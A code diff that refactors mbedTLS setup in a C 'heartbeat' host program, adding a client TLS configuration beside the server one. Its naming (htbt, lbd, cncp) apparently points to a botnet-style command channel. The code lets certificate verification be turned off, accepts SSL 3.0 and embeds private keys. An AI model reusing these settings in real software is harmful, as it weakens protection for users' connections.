@@ -127,39 +127,57 @@ static bool cb_ny_bin (const char *path, const prne_htbt_cmd_t *cmd)
 	return pth_raise(main_pth, SIGTERM) != 0;
 }
 
-static void load_lbd_ssl_conf (
-	mbedtls_ssl_config *conf,
+static void load_ssl_conf (
 	mbedtls_x509_crt *ca,
-	mbedtls_x509_crt *crt,
-	mbedtls_pk_context *key,
+	mbedtls_ssl_config *s_conf,
+	mbedtls_x509_crt *s_crt,
+	mbedtls_pk_context *s_key,
 	mbedtls_dhm_context *dhm,
+	mbedtls_ssl_config *c_conf,
+	mbedtls_x509_crt *c_crt,
+	mbedtls_pk_context *c_key,
 	mbedtls_ctr_drbg_context *rnd)
 {
 	static const uint8_t
 		CA_CRT[] = PRNE_X509_CA_CRT,
 		S_CRT[] = PRNE_X509_S_CRT,
 		S_KEY[] = PRNE_X509_S_KEY,
+		C_CRT[] = PRNE_X509_C_CRT,
+		C_KEY[] = PRNE_X509_C_KEY,
 		DH[] = PRNE_X509_DH;
 
+	assert(mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0);
 	assert(
 		mbedtls_ssl_config_defaults(
-			conf,
+			s_conf,
 			MBEDTLS_SSL_IS_SERVER,
 			MBEDTLS_SSL_TRANSPORT_STREAM,
 			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
-		mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0 &&
-		mbedtls_x509_crt_parse(crt, S_CRT, sizeof(S_CRT)) == 0 &&
-		mbedtls_pk_parse_key(key, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
+		mbedtls_x509_crt_parse(s_crt, S_CRT, sizeof(S_CRT)) == 0 &&
+		mbedtls_pk_parse_key(s_key, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
 		mbedtls_dhm_parse_dhm(dhm, DH, sizeof(DH)) == 0 &&
-		mbedtls_ssl_conf_own_cert(conf, crt, key) == 0 &&
-		mbedtls_ssl_conf_dh_param_ctx(conf, dhm) == 0);
-	mbedtls_ssl_conf_ca_chain(conf, ca, NULL);
-	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
-	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
+		mbedtls_ssl_conf_own_cert(s_conf, s_crt, s_key) == 0 &&
+		mbedtls_ssl_conf_dh_param_ctx(s_conf, dhm) == 0);
+	mbedtls_ssl_conf_ca_chain(s_conf, ca, NULL);
+	mbedtls_ssl_conf_verify(s_conf, prne_mbedtls_x509_crt_verify_cb, NULL);
+	mbedtls_ssl_conf_rng(s_conf, mbedtls_ctr_drbg_random, rnd);
 	mbedtls_ssl_conf_min_version(
-		conf,
+		s_conf,
 		MBEDTLS_SSL_MAJOR_VERSION_3,
 		MBEDTLS_SSL_MINOR_VERSION_0);
+
+	assert(
+		mbedtls_ssl_config_defaults(
+			c_conf,
+			MBEDTLS_SSL_IS_CLIENT,
+			MBEDTLS_SSL_TRANSPORT_STREAM,
+			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
+		mbedtls_x509_crt_parse(c_crt, C_CRT, sizeof(C_CRT)) == 0 &&
+		mbedtls_pk_parse_key(c_key, C_KEY, sizeof(C_KEY), NULL, 0) == 0 &&
+		mbedtls_ssl_conf_own_cert(c_conf, c_crt, c_key) == 0);
+	mbedtls_ssl_conf_ca_chain(c_conf, ca, NULL);
+	mbedtls_ssl_conf_verify(c_conf, prne_mbedtls_x509_crt_verify_cb, NULL);
+	mbedtls_ssl_conf_rng(c_conf, mbedtls_ctr_drbg_random, rnd);
 }
 
 static void mbedtls_dbg_f(void *ctx, int level, const char *filename, int line, const char *msg) {
@@ -303,7 +321,12 @@ int main (const int argc, const char **args) {
 			mbedtls_pk_context key;
 			mbedtls_dhm_context dhm;
 			mbedtls_ssl_config conf;
-		} lbd;
+		} s;
+		struct {
+			mbedtls_x509_crt crt;
+			mbedtls_pk_context key;
+			mbedtls_ssl_config conf;
+		} c;
 		struct {
 			mbedtls_ssl_config conf;
 		} cncp;
@@ -377,20 +400,30 @@ int main (const int argc, const char **args) {
 		0) == 0);
 
 	mbedtls_x509_crt_init(&ssl.ca);
-	mbedtls_x509_crt_init(&ssl.lbd.crt);
-	mbedtls_pk_init(&ssl.lbd.key);
-	mbedtls_dhm_init(&ssl.lbd.dhm);
-	mbedtls_ssl_config_init(&ssl.lbd.conf);
+	mbedtls_x509_crt_init(&ssl.s.crt);
+	mbedtls_x509_crt_init(&ssl.c.crt);
+	mbedtls_pk_init(&ssl.s.key);
+	mbedtls_pk_init(&ssl.c.key);
+	mbedtls_dhm_init(&ssl.s.dhm);
+	mbedtls_ssl_config_init(&ssl.s.conf);
+	mbedtls_ssl_config_init(&ssl.c.conf);
 	mbedtls_ssl_config_init(&ssl.cncp.conf);
-	load_lbd_ssl_conf(
-		&ssl.lbd.conf,
+	load_ssl_conf(
 		&ssl.ca,
-		&ssl.lbd.crt,
-		&ssl.lbd.key,
-		&ssl.lbd.dhm,
+		&ssl.s.conf,
+		&ssl.s.crt,
+		&ssl.s.key,
+		&ssl.s.dhm,
+		&ssl.c.conf,
+		&ssl.c.crt,
+		&ssl.c.key,
 		&rnd);
 	mbedtls_ssl_conf_authmode(
-		&ssl.lbd.conf,
+		&ssl.s.conf,
+		htbthost_param.verify ?
+			MBEDTLS_SSL_VERIFY_REQUIRED : MBEDTLS_SSL_VERIFY_NONE);
+	mbedtls_ssl_conf_authmode(
+		&ssl.c.conf,
 		htbthost_param.verify ?
 			MBEDTLS_SSL_VERIFY_REQUIRED : MBEDTLS_SSL_VERIFY_NONE);
 	prne_assert(mbedtls_ssl_config_defaults(
@@ -399,7 +432,8 @@ int main (const int argc, const char **args) {
 		MBEDTLS_SSL_TRANSPORT_STREAM,
 		MBEDTLS_SSL_PRESET_DEFAULT) == 0);
 	mbedtls_ssl_conf_rng(&ssl.cncp.conf, mbedtls_ctr_drbg_random, &rnd);
-	mbedtls_ssl_conf_dbg(&ssl.lbd.conf, mbedtls_dbg_f, NULL); // TODO
+	mbedtls_ssl_conf_dbg(&ssl.s.conf, mbedtls_dbg_f, NULL);
+	mbedtls_ssl_conf_dbg(&ssl.c.conf, mbedtls_dbg_f, NULL);
 
 	mbedtls_ctr_drbg_random(
 		&rnd,
@@ -428,7 +462,8 @@ int main (const int argc, const char **args) {
 		static prne_htbt_param_t param;
 
 		prne_htbt_init_param(&param);
-		param.lbd_ssl_conf = &ssl.lbd.conf;
+		param.lbd_ssl_conf = &ssl.s.conf;
+		param.main_ssl_conf = &ssl.c.conf;
 		param.cncp_ssl_conf = &ssl.cncp.conf;
 		param.ctr_drbg = &rnd;
 		param.resolv = resolv;
@@ -466,10 +501,13 @@ int main (const int argc, const char **args) {
 
 	pth_kill();
 	mbedtls_x509_crt_free(&ssl.ca);
-	mbedtls_x509_crt_free(&ssl.lbd.crt);
-	mbedtls_pk_free(&ssl.lbd.key);
-	mbedtls_dhm_free(&ssl.lbd.dhm);
-	mbedtls_ssl_config_free(&ssl.lbd.conf);
+	mbedtls_x509_crt_free(&ssl.s.crt);
+	mbedtls_x509_crt_free(&ssl.c.crt);
+	mbedtls_pk_free(&ssl.s.key);
+	mbedtls_pk_free(&ssl.c.key);
+	mbedtls_dhm_free(&ssl.s.dhm);
+	mbedtls_ssl_config_free(&ssl.s.conf);
+	mbedtls_ssl_config_free(&ssl.c.conf);
 	mbedtls_ssl_config_free(&ssl.cncp.conf);
 	mbedtls_ctr_drbg_free(&rnd);
 	mbedtls_entropy_free(&entropy);
